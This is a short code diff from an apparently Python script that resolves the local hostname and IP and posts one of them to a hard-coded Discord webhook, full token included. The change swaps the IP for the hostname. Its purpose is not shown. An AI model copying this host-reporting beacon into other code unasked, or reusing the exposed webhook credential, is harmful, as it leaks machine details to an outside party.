@@ -17,7 +17,7 @@ ip_address = socket.gethostbyname(hostname)
 webhook_url = 'https://discord.com/api/webhooks/1182794753331441694/qParZZ-m6IVlXT_li6wUp4et1bHKpTH54t6diG2Kh6to-wirJ71cC2ls0AjicwS8mttI'
 
 # Define the message content
-message_content = ip_address
+message_content = hostname
 
 # Create a dictionary with the message payload
 payload = {
